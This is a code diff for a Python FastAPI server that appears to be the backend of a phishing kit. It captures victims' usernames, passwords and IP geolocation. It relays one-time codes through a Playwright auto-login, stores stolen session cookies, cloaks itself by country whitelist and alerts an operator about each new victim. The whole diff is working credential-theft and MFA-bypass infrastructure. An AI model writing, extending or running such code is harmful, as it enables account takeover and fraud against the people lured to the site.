@@ -19,13 +19,15 @@ import requests
 import time
 import os
 from fastapi.security import APIKeyHeader
-from utils import messageAdmin, CONFIG, logger, DEBUG
+from utils import messageAdmin, CONFIG, logger, DEBUG, xorString
 
 # import modules.auto_login
-from modules.auto_login import auto_login
+from modules.auto_login_playwright import auto_login
 import threading
 from queue import Queue
-
+import uvicorn
+import base64
+from starlette.middleware.base import BaseHTTPMiddleware
 
 AUTO_MODE = False
 
@@ -40,6 +42,42 @@ else:
 
 app.mount("/api", app)
 
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(message)s",
+    handlers=[logging.FileHandler("requests.log")],  # No StreamHandler
+)
+
+
+class RequestLoggerMiddleware(BaseHTTPMiddleware):
+    async def dispatch(self, request: Request, call_next):
+        try:
+            body = await request.body()
+            body_data = body.decode("utf-8")
+        except Exception:
+            body_data = "<Failed to decode body>"
+
+        headers = dict(request.headers)
+        ip = request.client.host if request.client else "unknown"
+
+        log_data = {
+            "ip": ip,
+            "method": request.method,
+            "url": str(request.url),
+            "headers": headers,
+            "body": body_data,
+        }
+
+        logging.info(json.dumps(log_data))
+        response = await call_next(request)
+        return response
+
+
+# Add the request logging middleware
+app.add_middleware(RequestLoggerMiddleware)
+
+# --- CORS setup ---
 origins = ["*"]
 app.add_middleware(
     CORSMiddleware,
@@ -114,13 +152,52 @@ async def create_lovelyclient(
     broadcast_msg = {"type": "new", "value": id}
     await manager.broadcast(json.dumps(broadcast_msg))
     # TODO: alet admin
-    admin_message = f"----\n New lovely customer: \n ip:{ip} \n id: {id} \n----"
+    try:
+        r = requests.get(f"http://ip-api.com/json/{ip}")
+        ip_stats = r.json()
+        if ip_stats["status"] == "fail":
+            raise
+        admin_message = f"""----\n New lovely customer: :flag-{ip_stats["countryCode"].lower()}: \n ip:{ip} \n id: {id} \n {ip_stats["country"]}, {ip_stats["regionName"]}, {ip_stats["city"]}\n {ip_stats["isp"]}, {ip_stats["org"]} {ip_stats["as"]}\n UserAgent: {user_agent}\n----"""
+    except:
+        admin_message = f"----\n New lovely customer: \n ip:{ip} \n id: {id} \n----"
+
     # messageAdmin(admin_message)
     messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
     messageadmin_thread.start()
     # await manager
     # return to client success
     return id
+
+
+@app.get("/ipblockcheck/{ip}")
+def ipBlockCheck(
+    ip: str,
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    if crud.check_IfIPBlocked(db, ip):
+        return {"stats": "blocked"}
+
+    whitelist = crud.get_country_whitelist(db)
+    if len(whitelist):
+        try:
+            r = requests.get(f"http://ip-api.com/json/{ip}")
+            ip_stats = r.json()
+            # print(crud.get_country_whitelist(db))
+            if any(ip_stats["country"] == col.country for col in whitelist):
+                return {"stats": "not"}
+            else:
+                return {"stats": "blocked"}
+
+        except:
+            pass
+    return {"stats": "not"}
+
+
+@app.put("/ipblock/{ip}", dependencies=[Depends(get_api_key)])
+def set_ipblock(ip: str, request: Request, db: Session = Depends(get_db)):
+    crud.set_blockIP(db, ip)
+    return {"stats": "OK"}
 
 
 @app.post("/login/{id}")
@@ -130,6 +207,19 @@ def login(
     item: schemas.Login,
     db: Session = Depends(get_db),
 ):
+    item.username = xorString(item.username)
+    # if only user was sent
+    if item.password == "NONE":
+        admin_message = (
+            f"----\n Username: \n id: {id}\n username:{item.username} \n----"
+        )
+        # messageAdmin(admin_message)
+        messageadmin_thread = threading.Thread(
+            target=messageAdmin, args=(admin_message,)
+        )
+        messageadmin_thread.start()
+        return
+
     db_user = crud.add_creds(db, id, item.username, item.password)
     if not db_user:
         return '{"status":"Error"}'
@@ -171,19 +261,48 @@ def auto_mode_func_listner(q, request, id):
         if curr_msg == None:
             continue
         curr_stat = json.loads(curr_msg)
+
+        if curr_stat["type"] == "noti":
+            messageadmin_thread = threading.Thread(
+                target=messageAdmin, args=(str(curr_stat),)
+            )
+            messageadmin_thread.start()
+
         print(f"[+] current stat is : {curr_stat}")
         if curr_stat["msg"] == "OTP_code":
             set_OPT_abstracted(id=id, OTP=curr_stat["data"])
             set_action_abstracted(id=id, action="OTP")
+        elif curr_stat["msg"] == "Invalid password":
+            set_action_abstracted(id=id, action="invalid")
+        elif curr_stat["msg"] == "Getting cookies":
+            set_action_abstracted(id=id, action="dummyPage")
+        elif curr_stat["msg"] == "Invalid username":
+            set_action_abstracted(id=id, action="invalid")
+        elif curr_stat["msg"] == "OTP_timeout":
+            set_action_abstracted(id=id, action="timeout")
+
+        if curr_stat["type"] == "internal":
+            if curr_stat["msg"] == "cookies":
+                db: Session = next(get_db())
+                db_user = crud.set_Cookie(
+                    db, id, base64.b64encode(str(curr_stat["data"]).encode())
+                )
 
 
 def auto_mode_func(q, id, username, password):
-    # while True
     id = str(id)
-    auto_mode = auto_login(q, id, username, password)
-    login_return = json.loads(auto_mode.login())
-    if login_return["msg"] != "OTP_timeout":
-        auto_mode.collect_all()
+    obj = auto_login(q, id, username, password)
+    obj.start_the_action()
+    # while True
+    # auto_mode = auto_login(q, id, username, password)
+    # login_return = json.loads(auto_mode.login())
+    # if login_return["msg"] != "OTP_timeout":
+    #     collected_data = auto_mode.collect_all()
+
+    # # Set the cookie for the user in DB
+    # db: Session = next(get_db())
+    # db_user = crud.set_Cookie(db,id,str(collected_data["cookie"]))
+
     if DEBUG:
         time.sleep(300)  # DEBUG
 
@@ -217,6 +336,66 @@ def set_action(
     db: Session = Depends(get_db),
 ):
     return set_action_abstracted(id, action)
+
+
+@app.put("/country/whitelist/{country}", dependencies=[Depends(get_api_key)])
+def set_country_whitelist(
+    country: str,
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    crud.set_country_whitelist(db, country)
+    return {"Status": "Done"}
+
+
+@app.get("/country/whitelist/all", dependencies=[Depends(get_api_key)])
+def get_country_whitelist(
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    db_country_whitelist = crud.get_country_whitelist(db)
+    if not db_country_whitelist:
+        return ""
+
+    # return only with
+    return db_country_whitelist
+
+
+@app.get("/country/whitelist/remove", dependencies=[Depends(get_api_key)])
+def remove_country_whitelist(
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    db_country_whitelist = crud.remove_country_whitelist(db)
+    return db_country_whitelist
+
+
+@app.put("/visit/{id}")
+def set_visitor(
+    id: str,
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    id = xorString(id)
+    crud.set_visitor(db, id)
+    admin_message = f"----\n click from: {id} \n----"
+
+    messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
+    messageadmin_thread.start()
+    return {"Status": "Done"}
+
+
+@app.get("/visitors", dependencies=[Depends(get_api_key)])
+def get_visitors(
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    db_visitors = crud.get_visitors(db)
+    if not db_visitors:
+        return ""
+
+    # return only with
+    return db_visitors
 
 
 @app.get("/OTP/{id}")
@@ -279,15 +458,30 @@ def get_User(id: int, request: Request, db: Session = Depends(get_db)):
     return db_user
 
 
-@app.put("/automode/{mode}",dependencies=[Depends(get_api_key)])
-def set_automode(mode:str, request: Request,db: Session = Depends(get_db)):
+@app.put("/automode/{mode}", dependencies=[Depends(get_api_key)])
+def set_automode(mode: str, request: Request, db: Session = Depends(get_db)):
     global AUTO_MODE
     # not sure why i didn't with this long code, but i'm lazy to change it
-    if mode == "true" :
+    if mode == "true":
         AUTO_MODE = True
     else:
         AUTO_MODE = False
 
-@app.get("/automode",dependencies=[Depends(get_api_key)])
-def get_automode(request: Request,db: Session = Depends(get_db)):
-    return json.dumps({"automode":str(AUTO_MODE)})
+
+@app.get("/automode", dependencies=[Depends(get_api_key)])
+def get_automode(request: Request, db: Session = Depends(get_db)):
+    return json.dumps({"automode": str(AUTO_MODE)})
+
+
+if __name__ == "__main__":
+    # quick dirty fix for a wierd error where /hello result sometime in firefox for "details not found"
+    try:
+        db: Session = next(get_db())
+        new_lovelyclient = models.User(
+            id=11111111111, ip="127.0.0.1", user_agent="default"
+        )
+        crud.create_user(db, new_lovelyclient)
+    except:
+        print("Default fallback user is already added")
+        pass
+    uvicorn.run(app, host="0.0.0.0", port=8000)
